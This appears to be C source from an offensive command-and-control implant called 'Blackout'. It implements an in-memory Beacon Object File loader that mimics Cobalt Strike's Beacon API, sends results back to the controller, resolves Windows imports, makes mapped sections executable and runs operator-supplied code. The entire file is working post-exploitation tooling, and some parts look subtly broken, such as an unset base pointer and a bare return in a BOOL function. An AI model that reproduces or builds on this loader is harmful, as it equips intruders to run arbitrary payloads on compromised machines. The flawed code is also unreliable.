#include <common.h>
#include <evasion.h>

FUNC char *my_strchr(const char *str, int ch) {
    while (*str) {
        if (*str == (char)ch) {
            return (char *)str;
        }
        str++;
    }

    if (ch == '\0') {
        return (char *)str;
    }

    return NULL;
}

FUNC void BeaconGetSpawnto( BOOL x86, char* buffer, int length ) {
	BLACKOUT_INSTANCE
	if ( !buffer )
		return;

	MmCopy( buffer, Blackout().Fork.Spawnto, length );
}

FUNC void BeaconDataParse(datap* parser, char* buffer, int size) {
    if (parser == NULL) {
        return;
    }

    parser->original = buffer;
    parser->buffer = buffer;
    parser->length = size - 4;
    parser->size = size - 4;
    parser->buffer += 4;
}

FUNC int BeaconDataInt(datap* parser) {
    int fourbyteint = 0;
    if (parser->length < 4) {
        return 0;
    }
    MmCopy(&fourbyteint, parser->buffer, 4);
    parser->buffer += 4;
    parser->length -= 4;
    return (int)fourbyteint;
}

FUNC short BeaconDataShort(datap* parser) {
    short retvalue = 0;
    if (parser->length < 2) {
        return 0;
    }
    MmCopy(&retvalue, parser->buffer, 2);
    parser->buffer += 2;
    parser->length -= 2;
    return (short)retvalue;
}

FUNC int BeaconDataLength(datap* parser) {
    return parser->length;
}

FUNC char* BeaconDataExtract(datap* parser, int* size) {
    int   length  = 0;
    char* outdata = NULL;

    /*Length prefixed binary blob, going to assume uint32_t for this.*/
    if (parser->length < 4) {
        return NULL;
    }

    MmCopy(&length, parser->buffer, 4);
    parser->buffer += 4;

    outdata = parser->buffer;
    if (outdata == NULL) {
        return NULL;
    }

    parser->length -= 4;
    parser->length -= length;
    parser->buffer += length;
    if (size != NULL && outdata != NULL) {
        *size = length;
    }

    return outdata;
}

FUNC void BeaconOutput(int type, char* data, int len) {
	BLACKOUT_INSTANCE

 	BK_PACKAGE = PackageCreate( CMD_COFFLOADER );
    PackageAddBytes( BK_PACKAGE, data, len );
	PackageTransmit( BK_PACKAGE, NULL, NULL );
}

FUNC void BeaconPrintf(int type, char* fmt, ...) {
	BLACKOUT_INSTANCE

    va_list VaList = { 0 };

    va_start(VaList, fmt);
    Instance()->Win32.vprintf(fmt, VaList);
    va_end(VaList);
}

FUNC VOID CoffRelocation(
    ULONG Type, 
    PVOID Reloc, 
    PVOID SecBase
) {
	ULONG32 Offset32 = { 0 };
	ULONG64 Offset64 = { 0 };

	switch (Type)
	{
	case IMAGE_REL_AMD64_REL32:
        *(PUINT32) Reloc = (*(PUINT32)(Reloc)) + (ULONG)((ULONG_PTR)SecBase - (ULONG_PTR)Reloc - sizeof(UINT32));
	    break;

	case IMAGE_REL_AMD64_REL32_1:
		*(PUINT32)Reloc = (*(PUINT32)(Reloc)) + (ULONG)((ULONG_PTR)SecBase - (ULONG_PTR)Reloc - sizeof(UINT32) - 1);
		break;

	case IMAGE_REL_AMD64_REL32_2:
		*(PUINT32)Reloc = (*(PUINT32)(Reloc)) + (ULONG)((ULONG_PTR)SecBase - (ULONG_PTR)Reloc - sizeof(UINT32) - 2);
		break;

	case IMAGE_REL_AMD64_REL32_3:
		*(PUINT32)Reloc = (*(PUINT32)(Reloc)) + (ULONG)((ULONG_PTR)SecBase - (ULONG_PTR)Reloc - sizeof(UINT32) - 3);
		break;

	case IMAGE_REL_AMD64_REL32_4:
		*(PUINT32)Reloc = (*(PUINT32)(Reloc)) + (ULONG)((ULONG_PTR)SecBase - (ULONG_PTR)Reloc - sizeof(UINT32) - 4);
		break;

	case IMAGE_REL_AMD64_REL32_5:
		*(PUINT32)Reloc = (*(PUINT32)(Reloc)) + (ULONG)((ULONG_PTR)SecBase - (ULONG_PTR)Reloc - sizeof(UINT32) - 5);
		break;

	case IMAGE_REL_AMD64_ADDR64:
		*(PUINT64)Reloc = (*(PUINT64)(Reloc)) + (ULONG64)SecBase; 
		break;
	}
}

FUNC PVOID CoffResolveSymbol(
    PSTR Symbol
) {
    BLACKOUT_INSTANCE
    
    PSTR  Function			 = { 0 };
    PSTR  Library			 = { 0 };
	PCHAR Position			 = { 0 };
	CHAR  Buffer[ MAX_PATH ] = { 0 };
	PVOID Resolved			 = { 0 };
	PVOID Module		     = { 0 };

	if (!Symbol) {
	    return NULL;
	}

    //
	// remove the __imp_ 
	//
	Symbol += 6;

	//
	// check if it is an imported Beacon api 
	//
	if (Instance()->Win32.strncmp("Beacon", Symbol, 6) == 0) {
		if ( HASH_STR( "BeaconDataParse" ) == HASH_STR( Symbol ) ) {
		    Resolved = BeaconDataParse;
		} else if ( HASH_STR( "BeaconDataInt" ) == HASH_STR( Symbol ) ) {
			Resolved = BeaconDataInt;
		} else if ( HASH_STR( "BeaconDataShort" ) ==  HASH_STR( Symbol ) ) {
			Resolved = BeaconDataShort;
		} else if ( HASH_STR( "BeaconDataLength" ) == HASH_STR( Symbol ) ) {
			Resolved = BeaconDataLength;
		} else if ( HASH_STR( "BeaconDataExtract" ) == HASH_STR( Symbol ) ) {
			Resolved = BeaconDataExtract;
		} else if ( HASH_STR( "BeaconOutput" ) == HASH_STR( Symbol ) ) {
			Resolved = BeaconOutput;
		} else if ( HASH_STR( "BeaconPrintf" ) == HASH_STR( Symbol ) ) {
			Resolved = BeaconPrintf;
		}
	} else {
	    //
	    // resolve an imported/external function using
	    // the following syntax "LIBRARY$Function"
	    //

		//
		// copy the symbol into the buffer 
		//
		MmSet(  Buffer, 0, MAX_PATH );
	    MmCopy( Buffer, Symbol, StringLengthA( Symbol ) );

		//
		// replace the $ with a null byte 
		//
		Position  = my_strchr(Buffer, '$');
		*Position = 0;

		Library  = Buffer;
		Function = Position + 1;

		//
		// resolve the library instance
		// from the symbol string
		//
		if ( !(Module = Instance()->Win32.GetModuleHandleA( Library ) ) ) {
		    if ( !(Module = Instance()->Win32.LoadLibraryA( Library ) ) ) {
                BK_PRINT("[!] Module not found: %s\n", Library);
				return NULL;
		    }
		}

		//
		// resolve function from the loaded library 
		//
		if ( !(Resolved = Instance()->Win32.GetProcAddress( Module, Function ) ) ) {
			BK_PRINT( "[!] Function not found inside of %s: %s\n", Library, Function );
			return NULL;
		}
	}

	BK_PRINT(" -> %s @ %p\n", Symbol, Resolved);

	MmZero(Buffer, sizeof( Buffer ) );

	return Resolved; 
}

FUNC BOOL CoffProcessSection(
	_In_ POBJECT_CTX ObjCtx
) {
	BLACKOUT_INSTANCE

	PVOID		      SecBase  = { 0 };
	ULONG	          SecSize  = { 0 };
	PIMAGE_RELOCATION ObjRel   = { 0 };
	PIMAGE_SYMBOL	  ObjSym   = { 0 };
	PSTR			  Symbol   = { 0 };
	PVOID			  Resolved = { 0 };
	PVOID			  Reloc    = { 0 };
	ULONG			  FnIndex  = { 0 };

	//
	// process & relocate the object file sections
	// and process symbols and imported functions
	//
	for (int i = 0; i < ObjCtx->Header->NumberOfSections; i++) {
		ObjRel = (PIMAGE_RELOCATION)(ObjCtx->Base + ObjCtx->Sections[i].PointerToRelocations);

		//
		// iterate over section relocation and retrieve the each symbol
		// to check if it is an import (starting with an __imp_)
		//
		for (int j = 0; j < ObjCtx->Sections[i].NumberOfRelocations; j++) {
			ObjSym = &ObjCtx->SymTbl[ObjRel->SymbolTableIndex];

			//
			// get the symbol name 
			//
			if (ObjSym->N.Name.Short) {
				//
				// short name (8 bytes)
				//
				Symbol = (PSTR)ObjSym->N.ShortName;
			}
			else {
				//
				// long name (over 8 bytes) so we get to get
				// the symbol string via its offset 
				//
				Symbol = (PSTR)((ULONG_PTR)(ObjCtx->SymTbl + ObjCtx->Header->NumberOfSymbols) + (ULONG_PTR)ObjSym->N.Name.Long);
			}

			Reloc    = (PVOID)((ULONG_PTR)ObjCtx->SecMap[i].Base + ObjRel->VirtualAddress);
			Resolved = NULL;

			//
			// check if the symbol starts with an __imp_
			//
			if (Instance()->Win32.strncmp("__imp_", Symbol, 6) == 0) {
				//
				// if the symbol starts with __imp_ then
				// resolve the imported function 
				//
				if (!(Resolved = CoffResolveSymbol(Symbol))) {
					BK_PRINT("[!] CoffResolveSymbol failed to resolve symbol: %s\n", Symbol);
					return FALSE;
				}
			}

			//
			// perform relocation on the imported function 
			//
			if (ObjRel->Type == IMAGE_REL_AMD64_REL32 && Resolved) {
				ObjCtx->SymMap[FnIndex] = Resolved;

				*((PUINT32)Reloc) = (UINT32)(((ULONG_PTR)ObjCtx->SymMap + FnIndex * sizeof(PVOID)) - (ULONG_PTR)Reloc - sizeof(UINT32));

				FnIndex++;
			}
			else {
				SecBase = ObjCtx->SecMap[ObjSym->SectionNumber - 1].Base;

				//
				// perform relocation on the section 
				//
				CoffRelocation(ObjRel->Type, Reloc, SecBase);
			}

			//
			// handle next relocation item/symbol
			//
			ObjRel = (PVOID)((ULONG_PTR)ObjRel + sizeof(IMAGE_RELOCATION));
		}
	}

	return TRUE;
}

FUNC UINT32 CoffVmSize(
    POBJECT_CTX ObjCtx
) {
	BLACKOUT_INSTANCE

	PIMAGE_RELOCATION ObjRel = { 0 };
	PIMAGE_SYMBOL	  ObjSym = { 0 };
	PSTR			  Symbol = { 0 };
	ULONG			  Length = { 0 };

	//
	// calculate the size of sections + align the memory up 
	//
	for (int i = 0; i < ObjCtx->Header->NumberOfSections; i++) {
        Length += PAGE_ALIGN(ObjCtx->Sections[i].SizeOfRawData);
	}

	//
	// calculate the function map size 
	//
	for (int i = 0; i < ObjCtx->Header->NumberOfSections; i++) {
		ObjRel = (PIMAGE_RELOCATION)(ObjCtx->Base + ObjCtx->Sections[i].PointerToRelocations);

		//
		// iterate over section relocation and retrieve the each symbol
		// to check if it is an import (starting with an __imp_)
		//
		for (int j = 0; j < ObjCtx->Sections[i].NumberOfRelocations; j++) {
			ObjSym = &ObjCtx->SymTbl[ObjRel->SymbolTableIndex];

			//
			// get the symbol name 
			//
			if (ObjSym->N.Name.Short) {
				//
				// short name (8 bytes)
				//
				Symbol = (PSTR)ObjSym->N.ShortName;
			}
			else {
				//
				// long name (over 8 bytes) so we get to get
				// the symbol string via its offset 
				//
				Symbol = (PSTR)((ULONG_PTR)(ObjCtx->SymTbl + ObjCtx->Header->NumberOfSymbols) + (ULONG_PTR)ObjSym->N.Name.Long);
			}

			//
			// check if the symbol starts with an __imp_
			//
			if (Instance()->Win32.strncmp("__imp_", Symbol, 6) == 0) {
				Length += sizeof(PVOID);
			}
			
			//
			// handle next relocation item/symbol
			//
			ObjRel = (PVOID)((ULONG_PTR)ObjRel + sizeof(IMAGE_RELOCATION));
		}
	}

	return PAGE_ALIGN(Length);
}

FUNC BOOL CoffExecute(
    POBJECT_CTX ObjCtx, 
    PSTR        Entry, 
    PBYTE       Args, 
    ULONG       Argc
) {
    BLACKOUT_INSTANCE

    PVOID(*Main)(PBYTE, ULONG)  = NULL;

	PIMAGE_SYMBOL	   ObjSym  = { 0 };
	PSTR			   Symbol  = { 0 };
	PVOID			   SecBase = { 0 };
	ULONG			   SecSize = { 0 };
	ULONG			   Protect = { 0 };

	for (int i = 0; i < ObjCtx->Header->NumberOfSymbols; i++) {
		ObjSym = &ObjCtx->SymTbl[i];

		//
		// get the symbol name 
		//
		if (ObjSym->N.Name.Short) {
			//
			// short name (8 bytes)
			//
			Symbol = (PSTR)ObjSym->N.ShortName;
		}
		else {
			//
			// long name (over 8 bytes) so we get to get
			// the symbol string via its offset 
			//
			Symbol = (PSTR)((ULONG_PTR)(ObjCtx->SymTbl + ObjCtx->Header->NumberOfSymbols) + (ULONG_PTR)ObjSym->N.Name.Long);
		}

		//
		// check if it is a function defined
		// inside of the object file 
		//
	    if (ISFCN(ObjCtx->SymTbl[i].Type) && StringCompareA(Symbol, Entry) == 0) {
			//
			// get the section and change it to be executable
			// 
			SecBase = ObjCtx->SecMap[ObjSym->SectionNumber - 1].Base;
			SecSize = ObjCtx->SecMap[ObjSym->SectionNumber - 1].Size;

			//
			// make the section executable
			//
			if (!Instance()->Win32.VirtualProtect(SecBase, SecSize, PAGE_EXECUTE_READ, &Protect)) {
			    BK_PRINT("[!] VirtualProtect Failed with Error: %ld\n", NtLastError());
				break;
			}

			//
			// execute the bof entry point 
			//
			Main = (PVOID)((ULONG_PTR)(SecBase) + ObjSym->Value);

			Main( Args, Argc );

			//
			// revert the old section protection 
			//
			if ( !Instance()->Win32.VirtualProtect(SecBase, SecSize, Protect, &Protect)) {
				BK_PRINT("[!] VirtualProtect Failed with Error: %ld\n", NtLastError());
				break;
			}
			
			return TRUE; 
	    }
	}

	return FALSE;
}

FUNC BOOL CoffLdr( 
    PVOID  Object,
    PSTR   Function,
    PBYTE  Args,
    UINT32 Argc
) {
    BLACKOUT_INSTANCE

    OBJECT_CTX ObjCtx  = { 0 };
    UINT32     VmSize  = 0;
    PVOID      VmAddr  = NULL;
    PVOID      SecBase = NULL;
    UINT32     SecSize = 0;
    BOOL       bCheck  = FALSE;

    if ( !Object || !Function )
        return;

    ObjCtx.Header   = Object;
    ObjCtx.SymTbl   = U_PTR( Object + ObjCtx.Header->PointerToSymbolTable );
    ObjCtx.Sections = Object + sizeof( IMAGE_FILE_HEADER );

    if ( ObjCtx.Header->Machine != IMAGE_FILE_MACHINE_AMD64 )
        return FALSE;

	BK_PRINT( "aaa\n" );

	VmSize = CoffVmSize(&ObjCtx);
	BK_PRINT("[*] Virtual Size [%d bytes]\n", VmSize);

	//
	// allocate virtual memory 
	//
	if (!(VmAddr = Instance()->Win32.VirtualAlloc(NULL, VmSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE))) {
	    BK_PRINT("[!] VirtualAlloc Failed with Error: %ld\n", NtLastError());
		goto _END_OF_CODE;
	}

	//
	// allocate heap memory to store
	// the section map array 
	//
	if (!(ObjCtx.SecMap = bkHeapAlloc( ObjCtx.Header->NumberOfSections * sizeof(SECTION_MAP) ) ) ) {
		BK_PRINT("[!] HeapAlloc Failed with Error: %ld\n", NtLastError());
		return FALSE;
	}

	BK_PRINT("[*] Allocated object file @ %p [%ld bytes]\n", VmAddr, VmSize);

	//
	// set the section base to
	// the allocate memory 
	//
	SecBase = VmAddr;

	//
	// copy over the sections 
	//
	for (int i = 0; i < ObjCtx.Header->NumberOfSections; i++) {
		ObjCtx.SecMap[i].Size = SecSize = ObjCtx.Sections[i].SizeOfRawData;
		ObjCtx.SecMap[i].Base = SecBase;

		//
		// copy over the section data to
		// the newly allocated memory region
		//
		MmCopy(SecBase, (PVOID)(ObjCtx.Base + (ULONG_PTR)ObjCtx.Sections[i].PointerToRawData), SecSize);
		BK_PRINT(" -> %-8s @ %p [%ld bytes]\n", (PSTR)ObjCtx.Sections[i].Name, SecBase, SecSize);

		//
        // get the next page entry to write our
        // object data section into
        //
		SecBase = (PVOID)PAGE_ALIGN(((ULONG_PTR)SecBase + SecSize));
	}

	//
    // last page of the object memory is the symbol/function map
    //
	ObjCtx.SymMap = SecBase;

	BK_PRINT("\n=== Process Sections ===\n");
	if ( !( bCheck = CoffProcessSection( &ObjCtx ) ) ) {
	    BK_PRINT("[!] Failed to process sections\n");
		goto _END_OF_CODE;
	}

	BK_PRINT("\n=== Symbol Execution ===\n");
	if ( !( bCheck = CoffExecute( &ObjCtx, Function, Args, Argc ) ) ) {
		BK_PRINT("[!] Failed to execute function: %s\n", Function);
	    goto _END_OF_CODE;
	}

    BK_PRINT("[*] Object file successfully executed\n");
	
_END_OF_CODE:
	if (VmAddr) {
	    Instance()->Win32.VirtualFree( VmAddr, VmSize, MEM_RELEASE );
		VmAddr = NULL;
	}

	if (ObjCtx.SecMap) {
		bkHeapFree( ObjCtx.SecMap, ObjCtx.Header->NumberOfSections * sizeof(SECTION_MAP) );
		ObjCtx.SecMap = NULL;
	}

	//
	// clear the struct context from the stack
	//
	MmZero(&ObjCtx, sizeof(ObjCtx));

	return TRUE;
}
